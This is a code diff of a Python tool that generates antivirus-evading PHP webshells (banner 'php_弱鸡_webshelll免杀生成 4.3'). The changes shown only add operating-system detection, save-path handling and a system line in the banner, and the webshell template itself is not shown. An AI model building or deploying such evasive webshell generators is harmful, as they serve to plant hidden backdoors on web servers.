@@ -51,7 +51,7 @@ def free_kill(php_name):
             php_name = php_name + '.php'
             print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
     php_names = php_name
-    path = os.path.split(os.path.realpath(__file__))[0] #判断系统
+    path = os.path.split(os.path.realpath(__file__))[0]  # 判断系统
     path1 = path[0]
     s = '/'
     if path1 in s:
@@ -60,11 +60,28 @@ def free_kill(php_name):
         php_name = '\\' + php_name
 
     lj = input('输入保存shell文件的绝对路径(直接回车就是当前脚本路径)：')
+    path1 = path[0]
+    lj1 = lj[0]
+    l = '/'
+    w = '\\'
     if lj == '':
         lj = os.path.split(os.path.realpath(__file__))[0]
         print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
     else:
-        print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
+        if path1 in l:  # 判断系统
+            if lj1 in l:  # 判断用户输入的值是否有/ linux
+                print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
+            else:
+                lj = '/' + lj
+                print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
+        elif path1 in w:
+            if lj1 in l:  # 判断用户输入的值是否有\ windows
+                print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
+            else:
+                lj = os.path.split(os.path.realpath(__file__))[0]
+                print(colored('输入错误，讲使用默认路径: ', 'red'), lj)
+        else:
+            print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
     lj_data = lj + php_name
     print(colored('路径拼接成功：', 'green'), colored(lj_data, 'red'))
     webshelldata = f"""
@@ -314,6 +331,11 @@ if __name__ == "__main__":
         if config != None:
             path = os.path.split(os.path.realpath(__file__))[0]  # 获取脚本当前路径
             current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))  # 获取当前时间
+            path1 = path[0]
+            if path1 == '/':
+                xt = 'linux'
+            else:
+                xt = 'windows'
             print(f"""
             |---------------------------------------
             |{colored('php_弱鸡_webshelll免杀生成 4.3', 'red')}
@@ -338,6 +360,7 @@ if __name__ == "__main__":
             |配置信息
             |默认生成shell文件路径：{path}
             |time：{current_time}
+            |系统：{xt}
             |-------------------------------------------
             """)
             i = 1
@@ -347,6 +370,11 @@ if __name__ == "__main__":
             else:
                 path = os.path.split(os.path.realpath(__file__))[0]
                 current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
+                path1 = path[0]
+                if path1 == '/':
+                    xt = 'linux'
+                else:
+                    xt = 'windows'
                 print(f"""
                 |---------------------------------------
                 |{colored('php_弱鸡_webshelll免杀生成 4.3', 'red')}
@@ -371,6 +399,7 @@ if __name__ == "__main__":
                 |配置信息
                 |默认生成shell文件路径：{path}
                 |time：{current_time}
+                |系统：{xt}
                 |-------------------------------------------
                 """)
             free_kill(php_name=php)
